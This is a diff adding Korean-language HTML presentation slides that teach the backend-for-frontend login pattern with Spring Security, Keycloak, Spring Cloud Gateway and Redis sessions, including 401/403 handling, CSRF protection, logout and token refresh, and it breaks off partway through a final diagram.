+        <text x="280" y="292" text-anchor="middle" class="svg-text xs muted">화면 없이 즉시 복귀</text>
+        <rect x="10" y="130" width="190" height="60" rx="10" class="svg-app"/>
+        <text x="105" y="154" text-anchor="middle" class="svg-text small b">④ 원래 페이지 재진입</text>
+        <text x="105" y="174" text-anchor="middle" class="svg-text xs muted">같은 API 재호출 → 다시 403</text>
+        <path d="M380,42 L455,42 L455,128" class="svg-line bad dashed" marker-end="url(#arrow-bad)"/>
+        <path d="M455,190 L455,278 L382,278" class="svg-line bad dashed" marker-end="url(#arrow-bad)"/>
+        <path d="M180,278 L105,278 L105,192" class="svg-line bad dashed" marker-end="url(#arrow-bad)"/>
+        <path d="M105,130 L105,42 L178,42" class="svg-line bad dashed" marker-end="url(#arrow-bad)"/>
+        <text x="280" y="156" text-anchor="middle" class="svg-text lg b bad">무한 리다이렉트</text>
+        <text x="280" y="178" text-anchor="middle" class="svg-text xs muted">화면이 깜빡이며 반복된다</text>
+      </svg>
+      <figcaption>SSO가 잘 될수록 루프는 더 빠르게 돈다.</figcaption>
+    </figure>
+    <div class="stack">
+      <div class="card note"><h3>규칙</h3><ul><li><strong>401</strong> Unauthorized = 누구인지 모름 → <strong>로그인으로</strong></li><li><strong>403</strong> Forbidden = 알지만 권한 없음 → <strong>안내만</strong>, 이동 금지</li></ul></div>
+      <div class="card ok"><h3>BE도 구분해서 응답한다</h3><p class="small">세션·토큰 없음 → 401. <code>@PreAuthorize</code> 실패 → 403. Spring Security 기본 동작이므로 FE는 상태 코드만 믿으면 된다.</p></div>
+    </div>
+  </div>
+  <aside class="notes">401과 403을 "둘 다 인증 에러"로 묶어 처리하는 FE 코드가 흔하다. 이름부터 다르다: Unauthorized는 사실상 Unauthenticated, Forbidden이 진짜 "권한 없음".</aside>
+</section>
+
+<!-- 14. FE 최소 작업 -->
+<section class="slide">
+  <h2>FE가 할 일 전부 — 인터셉터 하나, 링크 두 개</h2>
+  <div class="cols w-3-2">
+    <div>
+      <p class="code-title">api.js — 전역 응답 인터셉터</p>
+<pre><code class="lang-js">axios.interceptors.response.use(
+  res =&gt; res,
+  err =&gt; {
+    const status = err.response?.status;
+    if (status === 401) {                       // 로그인 안 됨 → 로그인으로
+      sessionStorage.setItem('returnTo', location.pathname);
+      window.location.href = '/oauth2/authorization/keycloak';
+    } else if (status === 403) {                // 권한 없음 → 안내만, 이동 금지
+      toast('이 기능을 사용할 권한이 없습니다.');
+    }
+    return Promise.reject(err);
+  }
+);
+
+// 로그인 후 첫 진입 시 (App.vue / index.js)
+const back = sessionStorage.getItem('returnTo');
+if (back) { sessionStorage.removeItem('returnTo'); router.replace(back); }</code></pre>
+    </div>
+    <div class="stack">
+      <div class="card note"><h3>그 외</h3><ul><li>로그인 링크: <code>&lt;a href="/oauth2/authorization/keycloak"&gt;</code></li><li>로그아웃: <code>POST /logout</code> form (CSRF 토큰 포함, 슬라이드 21)</li><li>(선택) <code>GET /api/me</code>로 역할을 받아 메뉴 숨김 — 판단은 항상 BE</li></ul></div>
+      <div class="card warn"><h3>FE는 토큰을 본 적이 없다</h3><p class="small">Authorization 헤더를 붙이는 코드도, 갱신 코드도 없다. 쿠키는 브라우저가 자동으로 보낸다 (같은 출처면 <code>withCredentials</code>도 불필요).</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 15. 섹션 03 -->
+<section class="slide section">
+  <div class="num">03</div>
+  <h2>Spring으로 BFF 만들기</h2>
+  <p>로그인 대행 · 401 분기 · Gateway · 세션 · CSRF · 로그아웃 · 갱신 · 배치</p>
+</section>
+
+<!-- 16. 의존성 + yml -->
+<section class="slide">
+  <h2>의존성과 설정 — Keycloak 주소만 알려 주면 된다</h2>
+  <div class="cols w-2-3">
+    <div class="stack" style="min-width:0">
+      <div class="card"><h3>의존성 (<code>org.springframework.boot</code>)</h3><ul class="small"><li><code>spring-boot-starter-web</code></li><li><code>spring-boot-starter-security</code></li><li><code>spring-boot-starter-oauth2-client</code> ← BFF 핵심</li></ul></div>
+      <div class="card note"><h3>Keycloak 쪽 설정</h3><ul class="small"><li>Client ID <code>agent-portal</code>, Client authentication <strong>ON</strong> (confidential)</li><li>Valid redirect URIs: <code>https://app.company.com/login/oauth2/code/keycloak</code></li><li>Web origins는 비워 둔다 — 브라우저가 Keycloak을 fetch하지 않는다</li></ul></div>
+    </div>
+    <div style="min-width:0">
+      <p class="code-title">application.yml</p>
+<pre class="small"><code class="lang-yaml">spring:
+  security:
+    oauth2:
+      client:
+        registration:
+          keycloak:                      # ← 이 이름이 URL이 된다
+            client-id: agent-portal
+            client-secret: ${KEYCLOAK_CLIENT_SECRET}   # 환경변수. git 금지
+            authorization-grant-type: authorization_code
+            scope: openid, profile, email
+        provider:
+          keycloak:
+            issuer-uri: https://keycloak.company.com/realms/company</code></pre>
+      <p class="small muted" style="margin-top:8px">registration 이름 <code>keycloak</code> → 로그인 시작 <code>/oauth2/authorization/keycloak</code>, 콜백 <code>/login/oauth2/code/keycloak</code>. <code>issuer-uri</code> 하나로 인증·토큰·JWKS 주소를 자동 조회한다.</p>
+    </div>
+  </div>
+</section>
+
+<!-- 17. SecurityConfig -->
+<section class="slide">
+  <h2>SecurityConfig — 로그인은 자동, 401 분기만 직접</h2>
+  <div class="cols w-3-2">
+    <div>
+      <p class="code-title">BffSecurityConfig.java</p>
+<pre class="small"><code class="lang-java">@Configuration
+public class BffSecurityConfig {
+
+    @Bean
+    SecurityFilterChain bff(HttpSecurity http) throws Exception {
+        var api = PathPatternRequestMatcher.withDefaults().matcher("/api/**");
+        // Spring Security 6.5 미만: new AntPathRequestMatcher("/api/**")
+        http
+            .authorizeHttpRequests(auth -&gt; auth
+                .requestMatchers("/", "/index.html", "/assets/**").permitAll()
+                .anyRequest().authenticated())
+            .oauth2Login(Customizer.withDefaults())            // 슬라이드 11의 ④~⑧
+            .exceptionHandling(ex -&gt; ex
+                .defaultAuthenticationEntryPointFor(            // /api/** 는 302 대신 401
+                    new HttpStatusEntryPoint(HttpStatus.UNAUTHORIZED), api));
+        return http.build();
+    }
+}</code></pre>
+    </div>
+    <div class="stack">
+      <div class="card note"><h3>무엇이 자동인가</h3><p class="small"><code>oauth2Login()</code>: 302 조립(state, PKCE), 콜백 수신, code→토큰 교환, 세션 생성, 원래 페이지 복귀.</p></div>
+      <div class="card note"><h3>무엇을 직접 하나</h3><p class="small">EntryPoint 분기 한 줄. <code>/api/**</code>만 401, 나머지(페이지)는 기본값인 302.</p></div>
+      <div class="card warn"><h3>CSRF는 끄지 않았다</h3><p class="small">기본값(켜짐) 유지. SPA용 설정은 슬라이드 20.</p></div>
+    </div>
+  </div>
+  <aside class="notes">페이지 요청으로 로그인이 시작되면 Spring이 원래 URL을 세션에 저장해(RequestCache) 로그인 후 그리로 보낸다. API 401 → 인터셉터 경로로 시작되면 저장된 요청이 없어 "/"로 오므로 FE가 returnTo를 쓴다(슬라이드 14).</aside>
+</section>
+
+<!-- 18. Gateway TokenRelay -->
+<section class="slide">
+  <h2>뒤에 API가 여러 개라면 — Spring Cloud Gateway를 BFF로</h2>
+  <div class="cols w-2-3 middle">
+    <div style="min-width:0">
+      <p class="code-title">application.yml (Gateway)</p>
+<pre class="small"><code class="lang-yaml">spring:
+  cloud:
+    gateway:
+      default-filters:
+        - TokenRelay=     # 토큰 → Bearer
+      routes:
+        - id: report-api
+          uri: http://report-api:8080
+          predicates:
+            - Path=/api/reports/**
+        - id: agent-platform
+          uri: http://agent-platform:8080
+          predicates:
+            - Path=/api/agents/**
+# + 앞 슬라이드의 oauth2 client 설정 그대로
+# 4.3+: spring.cloud.gateway.server.webflux.* 권장</code></pre>
+      <p class="small muted" style="margin-top:8px">의존성: <code>spring-cloud-starter-gateway-server-webflux</code> (4.3+) + <code>spring-boot-starter-oauth2-client</code>. WebFlux 기반 → <code>SecurityWebFilterChain</code>.</p>
+    </div>
+    <figure class="diagram">
+      <svg viewBox="0 0 560 318" role="img" aria-label="브라우저가 쿠키로 Gateway를 부르면 Gateway가 세션의 토큰을 Bearer로 바꿔 여러 Resource Server에 전달하는 그림">
+        <rect x="10" y="120" width="120" height="60" rx="10" class="svg-user"/>
+        <text x="70" y="155" text-anchor="middle" class="svg-text b">브라우저</text>
+        <rect x="190" y="80" width="180" height="130" rx="12" class="svg-app"/>
+        <text x="280" y="106" text-anchor="middle" class="svg-text b">Gateway = BFF</text>
+        <rect x="205" y="120" width="150" height="76" rx="8" class="svg-token"/>
+        <text x="280" y="142" text-anchor="middle" class="svg-text small b token">세션: 토큰 보관</text>
+        <text x="280" y="162" text-anchor="middle" class="svg-text xs">TokenRelay 필터가</text>
+        <text x="280" y="180" text-anchor="middle" class="svg-text xs">Bearer 헤더로 바꿔 전달</text>
+        <rect x="430" y="30" width="120" height="44" rx="8" class="svg-app"/><text x="490" y="57" text-anchor="middle" class="svg-text small b">report-api</text>
+        <rect x="430" y="128" width="120" height="44" rx="8" class="svg-agent"/><text x="490" y="155" text-anchor="middle" class="svg-text small b">agent-platform</text>
+        <rect x="430" y="226" width="120" height="44" rx="8" class="svg-app"/><text x="490" y="253" text-anchor="middle" class="svg-text small b">search-api</text>
+        <rect x="200" y="250" width="160" height="40" rx="8" class="svg-idp"/><text x="280" y="275" text-anchor="middle" class="svg-text small b">Keycloak</text>
+        <path d="M130,150 L188,150" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="159" y="141" text-anchor="middle" class="svg-text xs">쿠키</text>
+        <path d="M370,110 L428,58" class="svg-line token" marker-end="url(#arrow-token)"/>
+        <path d="M370,150 L428,150" class="svg-line token" marker-end="url(#arrow-token)"/>
+        <path d="M370,190 L428,242" class="svg-line token" marker-end="url(#arrow-token)"/>
+        <text x="399" y="141" text-anchor="middle" class="svg-text xs token">Bearer</text>
+        <path d="M260,210 L260,248" class="svg-line idp" marker-end="url(#arrow-idp)"/>
+        <path d="M300,248 L300,210" class="svg-line token" marker-end="url(#arrow-token)"/>
+        <text x="280" y="310" text-anchor="middle" class="svg-text xs muted">각 API는 2회차의 Resource Server 그대로</text>
+      </svg>
+      <figcaption>BFF가 곧 업무 백엔드인 작은 시스템은 앞 슬라이드로 충분하다. 서비스가 여럿이면 Gateway 하나가 로그인·세션·중계를 맡는다.</figcaption>
+    </figure>
+  </div>
+</section>
+
+<!-- 19. 세션 + Redis -->
+<section class="slide">
+  <h2>세션 — 토큰이 서버에 있으니 세션 저장소가 필요하다</h2>
+  <div class="cols w-2-3 middle">
+    <div style="min-width:0">
+      <p class="code-title">application.yml</p>
+<pre class="small"><code class="lang-yaml"># 의존성: spring-session-data-redis
+spring:
+  data:
+    redis:
+      host: redis
+  session:
+    timeout: 8h          # idle 만료 (토큰과 별개)
+server:
+  servlet:
+    session:
+      cookie:
+        name: SESSION
+        http-only: true
+        secure: true
+        same-site: lax</code></pre>
+      <ul class="small" style="margin-top:10px">
+        <li>Spring Session이 <code>HttpSession</code>을 Redis로 투명하게 교체 — 코드 변경 없음</li>
+        <li>로컬 메모리 세션은 인스턴스 1대일 때만 동작</li>
+      </ul>
+    </div>
+    <figure class="diagram">
+      <svg viewBox="0 0 560 280" role="img" aria-label="브라우저 요청이 로드밸런서를 거쳐 BFF 두 대 중 아무 데나 가도 Redis의 같은 세션을 읽는 그림">
+        <rect x="10" y="110" width="110" height="56" rx="10" class="svg-user"/><text x="65" y="144" text-anchor="middle" class="svg-text b">브라우저</text>
+        <text x="65" y="190" text-anchor="middle" class="svg-text xs muted">Cookie: SESSION=3f9a…</text>
+        <rect x="160" y="110" width="110" height="56" rx="10" class="svg-app"/><text x="215" y="144" text-anchor="middle" class="svg-text small b">로드밸런서</text>
+        <rect x="320" y="30" width="120" height="56" rx="10" class="svg-app"/><text x="380" y="64" text-anchor="middle" class="svg-text b">BFF #1</text>
+        <rect x="320" y="190" width="120" height="56" rx="10" class="svg-app"/><text x="380" y="224" text-anchor="middle" class="svg-text b">BFF #2</text>
+        <rect x="480" y="98" width="70" height="80" rx="10" class="svg-token"/>
+        <text x="515" y="130" text-anchor="middle" class="svg-text b token">Redis</text>
+        <text x="515" y="150" text-anchor="middle" class="svg-text xs">세션</text>
+        <text x="515" y="165" text-anchor="middle" class="svg-text xs">= 토큰</text>
+        <path d="M120,138 L158,138" class="svg-line" marker-end="url(#arrow)"/>
+        <path d="M270,130 L318,70" class="svg-line" marker-end="url(#arrow)"/>
+        <path d="M270,146 L318,206" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="294" y="92" text-anchor="middle" class="svg-text xs muted">아무 쪽이나</text>
+        <path d="M440,66 L478,112" class="svg-line token" marker-end="url(#arrow-token)"/>
+        <path d="M440,210 L478,164" class="svg-line token" marker-end="url(#arrow-token)"/>
+        <text x="452" y="100" text-anchor="middle" class="svg-text xs token">세션 조회</text>
+        <text x="452" y="186" text-anchor="middle" class="svg-text xs token">세션 조회</text>
+        <text x="280" y="268" text-anchor="middle" class="svg-text small b">어느 인스턴스가 받아도 같은 세션 → 수평 확장</text>
+      </svg>
+      <figcaption>세션 timeout(idle)과 토큰 만료는 별개다. 세션이 살아 있어도 토큰은 갱신해야 한다(슬라이드 22).</figcaption>
+    </figure>
+  </div>
+</section>
+
+<!-- 20. CSRF -->
+<section class="slide">
+  <h2>CSRF — 쿠키는 자동으로 붙으니 한 겹 더 필요하다</h2>
+  <div class="cols w-3-2">
+    <div style="min-width:0">
+      <p class="code-title">BffSecurityConfig.java (추가)</p>
+<pre class="small"><code class="lang-java">http
+    .csrf(csrf -&gt; csrf
+        .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()) // XSRF-TOKEN 쿠키
+        .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler()))   // 헤더 값 비교
+    .addFilterAfter(new CsrfCookieFilter(), BasicAuthenticationFilter.class);
+
+// 토큰을 한 번 읽어야 쿠키가 실제로 내려간다 (지연 로딩)
+static class CsrfCookieFilter extends OncePerRequestFilter {
+    @Override
+    protected void doFilterInternal(HttpServletRequest req,
+            HttpServletResponse res, FilterChain chain)
+            throws ServletException, IOException {
+        ((CsrfToken) req.getAttribute(CsrfToken.class.getName())).getToken();
+        chain.doFilter(req, res);
+    }
+}</code></pre>
+    </div>
+    <div class="stack" style="min-width:0">
+      <div class="card note"><h3>왜 필요한가</h3><p class="small">쿠키는 <strong>다른 사이트가 보낸 요청</strong>에도 자동 첨부된다 → 공격 사이트가 사용자 브라우저로 <code>POST /api/transfer</code>를 보낼 수 있다.</p></div>
+      <ol class="steps compact">
+        <li><code>XSRF-TOKEN</code> 쿠키 발급 (HttpOnly 아님)</li>
+        <li>axios가 <code>X-XSRF-TOKEN</code> 헤더로 복사 (기본 동작)</li>
+        <li>Spring이 쿠키·헤더 비교 → 불일치면 403</li>
+      </ol>
+      <div class="card warn"><h3><code>csrf.disable()</code> 복붙 금지</h3><p class="small">2회차의 disable은 Bearer만 받는 순수 API용. 쿠키 세션 BFF에서는 금지. <code>SameSite=Lax</code>는 보조 방어일 뿐.</p></div>
+    </div>
+  </div>
+  <aside class="notes">BREACH 완화가 필요하면 Spring Security 문서의 SpaCsrfTokenRequestHandler(Xor 핸들러 + 평문 헤더 검증 조합)를 쓴다. 여기서는 구조를 보이기 위해 단순 핸들러를 사용.</aside>
+</section>
+
+<!-- 21. 로그아웃 -->
+<section class="slide">
+  <h2>로그아웃 — 앱 세션과 Keycloak SSO 세션을 함께 끊는다</h2>
+<pre class="small"><code class="lang-java">@Bean   // BffSecurityConfig.java (추가)
+SecurityFilterChain bff(HttpSecurity http,
+                        ClientRegistrationRepository regs) throws Exception {
+    var oidcLogout = new OidcClientInitiatedLogoutSuccessHandler(regs);
+    oidcLogout.setPostLogoutRedirectUri("{baseUrl}");       // Keycloak 로그아웃 후 복귀
+    http.logout(l -&gt; l.logoutSuccessHandler(oidcLogout));  // 앱 세션 + Keycloak SSO 세션
+    return http.build();                                     // (+ 앞 슬라이드의 설정)
+}</code></pre>
+  <div class="cols" style="margin-top:12px">
+    <figure class="diagram">
+      <svg viewBox="0 0 540 212" role="img" aria-label="브라우저가 BFF에 POST /logout 하면 BFF가 세션을 지우고 Keycloak 로그아웃 주소로 302, Keycloak이 SSO 세션을 지운 뒤 앱으로 돌려보내는 순서">
+        <rect x="20" y="6" width="130" height="38" rx="8" class="svg-user"/><text x="85" y="31" text-anchor="middle" class="svg-text b">브라우저</text>
+        <rect x="205" y="6" width="130" height="38" rx="8" class="svg-app"/><text x="270" y="31" text-anchor="middle" class="svg-text b">BFF</text>
+        <rect x="390" y="6" width="130" height="38" rx="8" class="svg-idp"/><text x="455" y="31" text-anchor="middle" class="svg-text b">Keycloak</text>
+        <line x1="85" y1="44" x2="85" y2="208" class="svg-lifeline"/>
+        <line x1="270" y1="44" x2="270" y2="208" class="svg-lifeline"/>
+        <line x1="455" y1="44" x2="455" y2="208" class="svg-lifeline"/>
+        <path d="M85,78 L262,78" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="175" y="70" text-anchor="middle" class="svg-text small">① POST /logout (form + CSRF)</text>
+        <path d="M270,118 L93,118" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="180" y="110" text-anchor="middle" class="svg-text small">② 세션 삭제 → 302 Keycloak /logout</text>
+        <path d="M85,158 L447,158" class="svg-line ok" marker-end="url(#arrow-ok)"/>
+        <text x="268" y="150" text-anchor="middle" class="svg-text small ok">③ 자동 이동 → SSO 세션 삭제 (②가 없으면 여기가 없다)</text>
+        <path d="M455,198 L93,198" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="275" y="190" text-anchor="middle" class="svg-text small">④ 302 → post_logout_redirect_uri ({baseUrl})</text>
+      </svg>
+    </figure>
+    <div class="stack">
+      <div class="card bad"><h3>앱 세션만 끊으면?</h3><p class="small">로그인 버튼을 누르면 SSO 세션 때문에 화면 없이 통과 → "로그아웃이 안 돼요".</p></div>
+      <div class="card note"><ul>
+        <li>FE는 <strong>form POST</strong> <code>/logout</code> + <code>_csrf</code> — fetch 금지 (302를 따라가야 함, 슬라이드 12)</li>
+        <li>Keycloak이 먼저 로그아웃시키면: Back-channel — <code>.oidcLogout(o -&gt; o.backChannel(…))</code> (6.2+)</li>
+      </ul></div>
+    </div>
+  </div>
+  <aside class="notes">id_token_hint는 세션에 보관한 ID 토큰. 그래서 BFF가 id_token도 들고 있었다(슬라이드 7). 공용 PC 환경이면 SSO 세션까지 끊는 것이 필수.</aside>
+</section>
+
+<!-- 22. 토큰 갱신 타임라인 -->
+<section class="slide">
+  <h2>토큰 갱신 — FE는 모르고, BFF가 조용히 바꿔 끼운다</h2>
+  <figure class="diagram">
+    <svg viewBox="0 0 1136 300" role="img" aria-label="세션 8시간 동안 5분짜리 access token이 refresh token으로 계속 갱신되는 타임라인. FE는 갱신을 모른다">
+      <text x="290" y="64" text-anchor="end" class="svg-text small b">세션 (SESSION 쿠키) · 8h idle</text>
+      <text x="290" y="82" text-anchor="end" class="svg-text xs muted">Spring Session timeout</text>
+      <rect x="300" y="48" width="800" height="26" rx="6" class="svg-app"/>
+      <text x="300" y="100" text-anchor="middle" class="svg-text xs muted">0분</text>
+      <text x="433" y="100" text-anchor="middle" class="svg-text xs muted">5</text>
+      <text x="567" y="100" text-anchor="middle" class="svg-text xs muted">10</text>
+      <text x="700" y="100" text-anchor="middle" class="svg-text xs muted">15</text>
+      <text x="833" y="100" text-anchor="middle" class="svg-text xs muted">20</text>
+      <text x="967" y="100" text-anchor="middle" class="svg-text xs muted">25</text>
+      <text x="1100" y="100" text-anchor="middle" class="svg-text xs muted">30분</text>
+      <text x="290" y="128" text-anchor="end" class="svg-text small b token">access token · 5분</text>
+      <text x="290" y="146" text-anchor="end" class="svg-text xs muted">Keycloak: Access Token Lifespan</text>
+      <rect x="300" y="110" width="130" height="26" rx="6" class="svg-token"/><text x="365" y="127" text-anchor="middle" class="svg-text mono xs">#1</text>
+      <rect x="433" y="110" width="130" height="26" rx="6" class="svg-token"/><text x="498" y="127" text-anchor="middle" class="svg-text mono xs">#2</text>
+      <rect x="567" y="110" width="130" height="26" rx="6" class="svg-token"/><text x="632" y="127" text-anchor="middle" class="svg-text mono xs">#3</text>
+      <rect x="700" y="110" width="130" height="26" rx="6" class="svg-token"/><text x="765" y="127" text-anchor="middle" class="svg-text mono xs">#4</text>
+      <rect x="833" y="110" width="130" height="26" rx="6" class="svg-token"/><text x="898" y="127" text-anchor="middle" class="svg-text mono xs">#5</text>
+      <rect x="967" y="110" width="130" height="26" rx="6" class="svg-token"/><text x="1032" y="127" text-anchor="middle" class="svg-text mono xs">#6</text>
+      <path d="M433,186 L433,140" class="svg-line idp" marker-end="url(#arrow-idp)"/><text x="438" y="166" class="svg-text xs idp">refresh</text>
+      <path d="M567,186 L567,140" class="svg-line idp" marker-end="url(#arrow-idp)"/><text x="572" y="166" class="svg-text xs idp">refresh</text>
+      <path d="M700,186 L700,140" class="svg-line idp" marker-end="url(#arrow-idp)"/><text x="705" y="166" class="svg-text xs idp">refresh</text>
+      <path d="M833,186 L833,140" class="svg-line idp" marker-end="url(#arrow-idp)"/><text x="838" y="166" class="svg-text xs idp">refresh</text>
+      <path d="M967,186 L967,140" class="svg-line idp" marker-end="url(#arrow-idp)"/><text x="972" y="166" class="svg-text xs idp">refresh</text>
+      <text x="290" y="206" text-anchor="end" class="svg-text small b idp">refresh token · 30분 idle</text>
+      <text x="290" y="224" text-anchor="end" class="svg-text xs muted">Keycloak: SSO Session Idle · 쓸 때마다 연장</text>
+      <rect x="300" y="188" width="800" height="26" rx="6" class="svg-idp"/>
+      <text x="568" y="262" text-anchor="middle" class="svg-text small b">요청마다 BFF가 세션의 '현재' access token을 붙인다 → FE는 갱신을 모른다</text>
+      <text x="568" y="284" text-anchor="middle" class="svg-text xs muted">OAuth2AuthorizedClientManager가 만료 직전(기본 clockSkew 60초)에 refresh token으로 자동 갱신 · refresh도 만료되면 401 → 다시 로그인</text>
+    </svg>
+    <figcaption>access token은 짧게(분), refresh token은 사용 중엔 연장, 세션은 업무 시간 단위. 셋의 만료는 각각 다른 설정이다.</figcaption>
+  </figure>
+</section>
+
+<!-- 23. 같은 출처 배치 -->
+<section class="slide">
+  <h2>배치 — FE와 BFF를 같은 출처에 둔다</h2>
+  <div class="cols w-3-2 middle">
+    <figure class="diagram">
+      <svg viewBox="0 0 680 300" role="img" aria-label="브라우저는 app.company.com 한 주소만 보고, 리버스 프록시가 경로에 따라 FE 정적 파일과 BFF로 나눠 보내는 그림. Keycloak은 로그인 때만 리다이렉트로 다녀온다">
+        <rect x="10" y="100" width="160" height="80" rx="10" class="svg-user"/>
+        <text x="90" y="130" text-anchor="middle" class="svg-text b">브라우저</text>
+        <text x="90" y="152" text-anchor="middle" class="svg-text xs mono">https://app.company.com</text>
+        <rect x="240" y="95" width="180" height="90" rx="10" class="svg-app"/>
+        <text x="330" y="125" text-anchor="middle" class="svg-text b">리버스 프록시</text>
+        <text x="330" y="147" text-anchor="middle" class="svg-text xs muted">nginx · Gateway</text>
+        <text x="330" y="166" text-anchor="middle" class="svg-text xs muted">TLS 종료</text>
+        <rect x="490" y="20" width="180" height="64" rx="10" class="svg-app"/>
+        <text x="580" y="46" text-anchor="middle" class="svg-text b">FE 정적 파일</text>
+        <text x="580" y="68" text-anchor="middle" class="svg-text xs mono">index.html · /assets/**</text>
+        <rect x="490" y="196" width="180" height="64" rx="10" class="svg-app"/>
+        <text x="580" y="222" text-anchor="middle" class="svg-text b">BFF (Spring)</text>
+        <text x="580" y="244" text-anchor="middle" class="svg-text xs mono">/api/** · /oauth2/**</text>
+        <rect x="240" y="236" width="180" height="50" rx="10" class="svg-idp"/>
+        <text x="330" y="258" text-anchor="middle" class="svg-text small b">Keycloak</text>
+        <text x="330" y="276" text-anchor="middle" class="svg-text xs mono">keycloak.company.com</text>
+        <path d="M170,140 L238,140" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="204" y="131" text-anchor="middle" class="svg-text xs">한 출처</text>
+        <path d="M420,118 L488,60" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="444" y="76" text-anchor="middle" class="svg-text xs mono">/</text>
+        <path d="M420,162 L488,222" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="426" y="218" text-anchor="middle" class="svg-text xs mono">/api/**</text>
+        <path d="M90,180 L90,261 L238,261" class="svg-line muted dashed" marker-end="url(#arrow-muted)"/>
+        <text x="160" y="252" text-anchor="middle" class="svg-text xs muted">로그인 때만 302로 다녀옴</text>
+      </svg>
+      <figcaption>브라우저는 주소 하나만 본다. 경로로 FE와 BFF를 나눈다.</figcaption>
+    </figure>
+    <div class="stack">
+      <div class="card ok"><h3>같은 출처면</h3><ul class="small"><li>CORS 설정 불필요</li><li>쿠키 SameSite 문제 없음, <code>withCredentials</code> 불필요</li><li>Keycloak은 다른 출처여도 된다 — 리다이렉트로 다녀올 뿐 fetch하지 않는다</li></ul></div>
+      <div class="card warn"><h3>FE와 BFF 도메인이 다르면</h3><p class="small">CORS 허용 + <code>SameSite=None; Secure</code> + <code>withCredentials</code> — 피할 수 있으면 피한다.</p></div>
+      <div class="card note"><h3>개발 환경</h3><p class="small">Vite/webpack dev server의 proxy로 <code>/api</code> → <code>localhost:8080</code>. 같은 출처를 흉내 낸다.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 24. 비교 표 -->
+<section class="slide">
+  <h2>두 방식 비교 — 사내 웹과 에이전트 플랫폼에는 BFF</h2>
+  <table class="compact">
+    <thead><tr><th style="width:18%">구분</th><th>SPA + PKCE</th><th>BFF</th></tr></thead>
+    <tbody>
+      <tr><td>토큰 위치</td><td>브라우저 JS 메모리</td><td>BFF 서버 세션</td></tr>
+      <tr><td>XSS 시 피해</td><td class="bad">토큰 탈취, 외부에서 재사용</td><td class="ok">열린 페이지 안에서만</td></tr>
+      <tr><td>Keycloak client 유형</td><td>public (secret 없음)</td><td>confidential (secret 보유)</td></tr>
+      <tr><td>서버 상태</td><td>stateless</td><td>stateful — 세션 저장소(Redis) 필요</td></tr>
+      <tr><td>CSRF 대책</td><td>불필요 (헤더 토큰)</td><td>필요 (쿠키 자동 첨부)</td></tr>
+      <tr><td>FE 작업</td><td>로그인·갱신·헤더 첨부 라이브러리</td><td>인터셉터 + 링크</td></tr>
+      <tr><td>추가 hop</td><td>없음</td><td>BFF 한 단계</td></tr>
+      <tr><td>적합</td><td>서버를 둘 수 없는 순수 정적 배포</td><td class="ok">대부분의 사내 웹 + 에이전트 플랫폼 (권장)</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- 25. 섹션 04 -->
+<section class="slide section">
+  <div class="num">04</div>
+  <h2>자주 하는 실수</h2>
+  <p>증상으로 먼저 만나고, 원인은 나중에 아는 것들</p>
+</section>
+
+<!-- 26. 실수 카드 -->
+<section class="slide">
+  <h2>자주 하는 실수</h2>
+  <div class="cols c-3" style="gap:16px">
+    <div class="card bad"><h3>❌ API에 302 응답</h3><p class="small">fetch가 로그인 HTML을 JSON으로 받는다. <code>/api/**</code>는 401로 분기.</p></div>
+    <div class="card bad"><h3>❌ 403에 로그인 리다이렉트</h3><p class="small">SSO 세션이 즉시 되돌려 보내 무한 루프. 403은 안내만.</p></div>
+    <div class="card bad"><h3>❌ <code>csrf.disable()</code> 복붙</h3><p class="small">쿠키 세션 BFF에서 끄면 다른 사이트가 사용자 브라우저로 요청을 보낼 수 있다.</p></div>
+    <div class="card bad"><h3>❌ 토큰을 localStorage에</h3><p class="small">탭을 닫아도 남고 모든 스크립트가 읽는다. BFF에선 FE가 토큰을 볼 일 자체가 없다.</p></div>
+    <div class="card bad"><h3>❌ 로컬 메모리 세션 + 인스턴스 2대</h3><p class="small">다른 인스턴스로 가면 로그아웃된 것처럼 보인다. Spring Session + Redis.</p></div>
+    <div class="card bad"><h3>❌ 앱 세션만 로그아웃</h3><p class="small">Keycloak SSO 세션이 남아 화면 없이 재로그인. <code>OidcClientInitiatedLogoutSuccessHandler</code>.</p></div>
+  </div>
+  <div class="card warn" style="margin-top:16px"><h3>⚠ BFF가 사용자 토큰 대신 자기 토큰으로 뒤쪽 API를 부른다</h3><p class="small">client credentials로 받은 BFF 자신의 토큰을 중계하면 사용자 role이 사라지고 모든 사용자가 BFF의 권한으로 실행된다. 반드시 <strong>세션의 사용자 토큰</strong>을 중계한다 — 4회차의 출발점.</p></div>
+</section>
+
+<!-- 27. 에이전트 플랫폼과의 연결 -->
+<section class="slide">
+  <h2>에이전트 플랫폼과의 연결 — BFF는 사용자 토큰을 들고 있는 유일한 곳</h2>
+  <figure class="diagram">
+    <svg viewBox="0 0 1136 300" role="img" aria-label="브라우저 쿠키로 BFF, BFF가 사용자 토큰으로 에이전트 플랫폼, 플랫폼이 Keycloak과 Token Exchange로 교환한 토큰(sub kim, act report-agent)으로 업무 API를 부르는 체인">
+      <rect x="10" y="100" width="150" height="70" rx="10" class="svg-user"/>
+      <text x="85" y="140" text-anchor="middle" class="svg-text b">브라우저</text>
+      <rect x="220" y="100" width="180" height="70" rx="10" class="svg-app"/>
+      <text x="310" y="128" text-anchor="middle" class="svg-text b">BFF</text>
+      <text x="310" y="150" text-anchor="middle" class="svg-text xs muted">사용자 토큰 보관</text>
+      <rect x="460" y="100" width="200" height="70" rx="10" class="svg-agent"/>
+      <text x="560" y="128" text-anchor="middle" class="svg-text b">에이전트 플랫폼</text>
+      <text x="560" y="150" text-anchor="middle" class="svg-text xs mono">report-agent</text>
+      <rect x="460" y="236" width="200" height="50" rx="10" class="svg-idp"/>
+      <text x="560" y="266" text-anchor="middle" class="svg-text b">Keycloak</text>
+      <rect x="930" y="100" width="190" height="70" rx="10" class="svg-app"/>
+      <text x="1025" y="128" text-anchor="middle" class="svg-text b">업무 API</text>
